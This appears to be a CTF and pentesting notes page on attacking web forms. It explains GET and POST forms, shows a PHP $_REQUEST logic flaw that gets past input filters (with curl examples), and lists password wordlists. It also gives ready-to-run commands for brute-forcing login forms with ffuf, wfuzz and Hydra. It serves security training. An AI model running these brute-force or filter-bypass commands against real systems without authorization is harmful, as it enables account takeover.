# Bruteforce forms, and other vulnerabilities

<div class="row row-cols-md-2"><div>

There are two kinds of forms: **GET forms**, in which the parameters of the form are stored within the URL, and anyone opening the URL, will see the form filled with the same input. For instance, a search engine such as Google has a parameter `q` (query) in which the search I made `(hello world)` was stored in.

```
https://www.google.com/search?q=hello+world
https://www.google.com/search?q=hello%20world
```

Search are URL-encoded as a URL is a long suite of characters with no spaces, for instance, space would be either `%20`, or `+`.
</div><div>

Then, we have **POST forms**. They are mostly used for logins/... Once the user submit data, then its encoded, and sent to the server. Even if we have the same URL, the page will be empty for us.

```
https://example.com/login.php
```

The common point between the two are that the data transferred is looking like this: `username=toto&password=toto`, and in both, it's URL-encoded.
</div></div>

> **Note**: BurpSuite can be used too, see the Intruder tab.<br>

<hr class="sep-both">

## Logic Flaw

[![authenticationbypass](../../../_badges/thmp/authenticationbypass.svg)](https://tryhackme.com/room/authenticationbypass)

<div class="row row-cols-md-2"><div>

In PHP, there is a variable `$_POST` to fetch the input fields send to the server using POST, and `$_GET` for input fields send using GET. There is another prefilled variable: `$_REQUEST` which contains both values in `$_GET`, and values in `$_POST`. 

If a value is both in `$_POST`, AND `$_GET`, then ONLY the value in `$_POST` will be kept. This is worth mentioning, because

* a developer might use `$_REQUEST` for a GET form, instead of `$_GET`. In such case, we may be able to inject data using POST, so that even if the data send using GET is filtered, we may bypass these filters.

```bash
$ curl 'URL?param=value' -d 'param=not_filtered'
# the dev filter $_GET: filterXXX($_GET)
# but in $_REQUEST['param'], there will be
# our value 'not_filtered'
```
</div><div>

* it's possible that a developer is using a GET form, then a POST form. In such scenario, the (lazy?) developer may use `$_REQUEST` to fetch values. If the dev checked the data at step1, but not at step2, we may be able to bypass the check in step1.

```bash
$ curl 'URL/step1?param=verified'
# the dev ensure param is verified
# verify_or_reject_param($_GET)
# now, the dev may "trust" param to be valid
$ curl 'URL/step2?param=verified' -d 'xxx=yyy&param=unverified'
# the dev filter $_POST: filterXXX($_POST)
# the dev uses $_REQUEST['param']
# but, it's our unverified value that is used
```
</div></div>

<hr class="sep-both">

## Wordlists

<div class="row row-cols-md-2"><div>

* package wordlist

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/dirb/others/best1050.txt
/usr/share/wordlists/dirb/others/best110.txt
/usr/share/wordlists/dirb/others/best15.txt
```

</div><div>

* package seclists ðŸ“Œ

```
$ ls /usr/share/seclists/Passwords/
2020-200_most_used_passwords.txt
darkc0de.txt
darkweb2017-top10000.txt
$ ls /usr/share/seclists/Passwords/Common-Credentials
10k-most-common.txt
10-million-password-list-top-1000000.txt
$ ls /usr/share/seclists/Usernames/
xato-net-10-million-usernames.txt
```
</div></div>

> CTF are usually using `/usr/share/wordlists/rockyou.txt`, and a manually created list of usernames if needed.

<hr class="sep-both">

## Bruteforce using ffuf

[See fuzzing/ffuf for more information](../fuzz/index.md#ffuf---fuzz-faster-u-fool)

<div class="row row-cols-md-2"><div>

Try to bruteforce a GET form.

```bash
$ ffuf -w wordlist -u URL/account?id=FUZZ
```
</div><div>

Try to bruteforce a POST form.

```bash
$ ffuf -w wordlist -X POST -d "username=admin&pass=FUZZ" URL/login.php
$ ffuf -w wordlist1:W1,wordlist2:W2 -X POST -d "username=W1&password=W2" -u URL
```
</div></div>

<hr class="sep-both">

## Bruteforce using wfuzz

[See fuzzing/wfuzz for more information](../fuzz/index.md#wfuzz---web-application-fuzzer)

<div class="row row-cols-md-2"><div>

Try to bruteforce a GET form.

```bash
$ wfuzz -w wordlist URL/account?id=FUZZ
```
</div><div>

Try to bruteforce a POST form.

```bash
$ wfuzz -w wordlist -d "username=admin&pass=FUZZ" URL/login.php
```
</div></div>

<hr class="sep-both">

## Bruteforce authentication forms using Hydra

<div class="row row-cols-md-2"><div>

Hydra is mostly used to bruteforce services, but it can also be used with authentication forms.

```bash
$ hydra -l toto -P wordlist URL http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V
```

<p class="mt-3">The request that we will bruteforce is something like this</p>

```none
username=toto&password=xxx
```
</div><div>

This command will

* Attack the form located at `URL/login.php` <small>(the `/login.php`)</small>
* Set the field with the name "username" with "toto"
* Set the field with the name "password" with every entry in the wordlist, on by one
* Consider comme failures (`-F`) any web page that returns the word "incorrect"

You should check the [bruteforce services](/cyber/exploitation/services/bruteforce.md) page to learn more about Hydra.
</div></div>